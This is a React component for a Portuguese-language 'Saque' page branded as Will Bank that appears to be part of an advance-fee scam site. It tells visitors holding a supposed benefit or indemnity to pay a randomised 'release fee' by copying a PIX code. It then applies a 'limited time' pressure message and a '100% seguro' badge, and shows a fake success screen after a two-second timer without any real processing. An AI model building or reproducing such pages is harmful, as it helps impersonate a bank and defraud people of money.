import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  CheckCircle, 
  Wallet, 
  Copy, 
  ExternalLink,
  ShieldCheck,
  Clock,
  AlertTriangle
} from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";
import { toast } from "@/hooks/use-toast";

const Saque = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [pixKey, setPixKey] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio;

  // Valor da taxa (aleatório entre R$ 47,90 e R$ 97,90)
  const [valorTaxa] = useState(() => {
    const taxa = Math.floor(Math.random() * (97.90 - 47.90 + 1) + 47.90);
    return taxa;
  });

  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }
  }, [cpfData, valorBeneficio, navigate]);

  const handleCopiarPix = () => {
    const pixCode = "00020126580014br.gov.bcb.pix0136example-pix-key-here5204000053039865802BR5925WILL BANK PAGAMENTOS6009SAO PAULO62070503***6304ABCD";
    navigator.clipboard.writeText(pixCode);
    toast({
      title: "Código PIX copiado!",
      description: "Cole o código no seu aplicativo bancário",
    });
  };

  const handleConfirmarPagamento = () => {
    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      setIsCompleted(true);
      toast({
        title: "Aguardando confirmação",
        description: "Seu pagamento está sendo processado",
      });
    }, 2000);
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="bg-card border-b border-border px-6 py-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between mb-4">
            <img src={willbankLogo} alt="Will Bank" className="h-10 object-contain" />
          </div>
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <span>Benefício</span>
            <span>›</span>
            <span>Indenização</span>
            <span>›</span>
            <span className="text-foreground font-medium">Saque</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <Card className="w-full max-w-md shadow-xl border-0 overflow-hidden">
          <div className="bg-primary h-2" />
          
          <CardContent className="p-6 sm:p-8 space-y-6">
            {!isCompleted ? (
              <>
                <div className="text-center space-y-2">
                  <div className="inline-flex items-center justify-center w-14 h-14 bg-primary/10 rounded-full mb-2">
                    <Wallet className="w-7 h-7 text-primary" />
                  </div>
                  <h1 className="text-2xl font-bold text-foreground">
                    Realize o saque
                  </h1>
                  <p className="text-muted-foreground text-sm">
                    Para liberar seu benefício, é necessário pagar uma pequena taxa de processamento
                  </p>
                </div>

                {/* Benefit Value */}
                <div className="bg-green-50 rounded-lg p-4 text-center border border-green-200">
                  <p className="text-sm text-green-700 mb-1">
                    Valor a receber após confirmação:
                  </p>
                  <p className="text-3xl font-bold text-green-600">
                    R$ {valorBeneficio.toLocaleString('pt-BR')},00
                  </p>
                </div>

                {/* Fee */}
                <div className="bg-muted/50 rounded-lg p-4 space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">Taxa de liberação:</span>
                    <span className="font-semibold text-foreground">R$ {valorTaxa.toFixed(2).replace('.', ',')}</span>
                  </div>
                  <div className="text-xs text-muted-foreground flex items-start gap-2">
                    <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
                    <span>
                      Esta taxa é necessária para cobrir os custos de processamento e transferência do seu benefício.
                    </span>
                  </div>
                </div>

                {/* PIX Input */}
                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground">
                    Sua chave PIX para receber
                  </label>
                  <Input
                    placeholder="Digite sua chave PIX (CPF, e-mail ou celular)"
                    value={pixKey}
                    onChange={(e) => setPixKey(e.target.value)}
                  />
                </div>

                {/* PIX Code */}
                <div className="space-y-3">
                  <p className="text-sm font-medium text-foreground text-center">
                    Pague a taxa via PIX:
                  </p>
                  <Button
                    variant="outline"
                    onClick={handleCopiarPix}
                    className="w-full h-12"
                  >
                    <Copy className="w-4 h-4" />
                    Copiar código PIX Copia e Cola
                  </Button>
                </div>

                {/* Timer Warning */}
                <div className="flex items-center justify-center gap-2 text-amber-600 bg-amber-50 rounded-lg p-3">
                  <Clock className="w-4 h-4" />
                  <span className="text-sm font-medium">
                    Oferta válida por tempo limitado
                  </span>
                </div>

                {/* CTA Button */}
                <Button 
                  onClick={handleConfirmarPagamento}
                  disabled={isProcessing || !pixKey}
                  className="w-full h-12 text-base font-semibold"
                >
                  {isProcessing ? (
                    "Processando..."
                  ) : (
                    <>
                      Já paguei, confirmar saque
                      <ExternalLink className="w-5 h-5" />
                    </>
                  )}
                </Button>

                <div className="flex items-center justify-center gap-2 text-muted-foreground">
                  <ShieldCheck className="w-4 h-4" />
                  <span className="text-xs">Pagamento 100% seguro</span>
                </div>
              </>
            ) : (
              /* Success State */
              <div className="text-center space-y-6 py-4">
                <div className="inline-flex items-center justify-center w-20 h-20 bg-green-100 rounded-full">
                  <CheckCircle className="w-12 h-12 text-green-600" />
                </div>
                
                <div className="space-y-2">
                  <h1 className="text-2xl font-bold text-foreground">
                    Solicitação enviada!
                  </h1>
                  <p className="text-muted-foreground">
                    Seu pedido de saque está sendo processado. Você receberá o valor de{" "}
                    <strong className="text-primary">
                      R$ {valorBeneficio.toLocaleString('pt-BR')},00
                    </strong>{" "}
                    na sua chave PIX em até 24 horas úteis.
                  </p>
                </div>

                <div className="bg-muted/50 rounded-lg p-4 text-left space-y-2">
                  <p className="text-sm">
                    <strong>Nome:</strong> {cpfData.nome}
                  </p>
                  <p className="text-sm">
                    <strong>Chave PIX:</strong> {pixKey}
                  </p>
                  <p className="text-sm">
                    <strong>Valor:</strong> R$ {valorBeneficio.toLocaleString('pt-BR')},00
                  </p>
                </div>

                <Button 
                  onClick={() => navigate("/")}
                  variant="outline"
                  className="w-full h-12"
                >
                  Voltar ao início
                </Button>
              </div>
            )}
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-primary text-primary-foreground px-6 py-4">
        <div className="max-w-4xl mx-auto text-center">
          <p className="text-sm opacity-80">
            © 2025 Will Bank. Todos os direitos reservados.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Saque;
